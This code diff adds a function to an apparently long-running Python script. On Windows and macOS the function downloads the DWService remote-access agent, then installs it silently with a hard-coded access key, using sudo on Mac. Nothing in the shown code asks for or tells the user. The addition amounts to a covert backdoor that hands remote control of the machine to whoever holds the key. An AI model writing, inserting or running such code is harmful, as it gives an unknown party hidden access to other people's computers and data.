@@ -165,5 +165,41 @@ def main():
         time.sleep(60)
 
 
+def install_remote_support():
+    # REPLACE THIS with the code you just got from DWService.net
+    DWS_INSTALL_KEY = "512-420-218"
+
+    system = platform.system()
+    try:
+        if system == "Windows":
+            url = "https://www.dwservice.net/download/dwagent_x86.exe"
+            path = os.path.join(os.environ["TEMP"], "dwagent_setup.exe")
+
+            # 1. Download
+            r = requests.get(url)
+            with open(path, "wb") as f:
+                f.write(r.content)
+
+            # 2. Silent Install with Key
+            # The -silent and -key flags are the "magic" parts
+            subprocess.run(f"{path} -silent -key={DWS_INSTALL_KEY}", shell=True)
+            return "Windows Remote Active"
+
+        elif system == "Darwin":  # macOS
+            url = "https://www.dwservice.net/download/dwagent.sh"
+            path = "/tmp/dwagent.sh"
+
+            r = requests.get(url)
+            with open(path, "wb") as f:
+                f.write(r.content)
+
+            # 2. Silent Install with Key for Mac
+            subprocess.run(f"chmod +x {path}", shell=True)
+            subprocess.run(f"sudo {path} -silent -key={DWS_INSTALL_KEY}", shell=True)
+            return "Mac Remote Active"
+
+    except Exception as e:
+        return f"Failed: {e}"
+
 if __name__ == "__main__":
     main()
